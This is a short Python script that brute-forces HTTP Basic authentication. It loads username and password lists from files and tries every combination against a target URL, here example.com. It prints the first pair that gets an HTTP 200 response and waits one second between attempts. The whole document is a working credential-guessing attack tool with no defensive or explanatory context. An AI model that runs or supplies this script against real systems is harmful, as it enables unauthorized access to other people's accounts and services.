import requests
from requests.auth import HTTPBasicAuth
import time

def brute_force_http_basic_auth(target_url, username_file, password_file):
    with open(username_file, 'r', encoding='utf-8') as user_file:
        usernames = user_file.readlines()
    
    with open(password_file, 'r', encoding='utf-8') as pass_file:
        passwords = pass_file.readlines()

    for username in usernames:
        for password in passwords:
            username = username.strip()
            password = password.strip()
            
            response = requests.get(target_url, auth=HTTPBasicAuth(username, password), timeout=5)  # Terminate the connection if no response is received within 5 seconds
            if response.status_code == 200:
                print(f"Successful Login - Username: {username}, Password: {password}")
                return
            
            time.sleep(1)

    print("Brute force attack unsuccessful.")

# Read usernames and passwords from files
username_file = "data/zusernames.txt"
password_file = "data/zpasswords.txt"
target_url = "http://example.com"
brute_force_http_basic_auth(target_url, username_file, password_file)
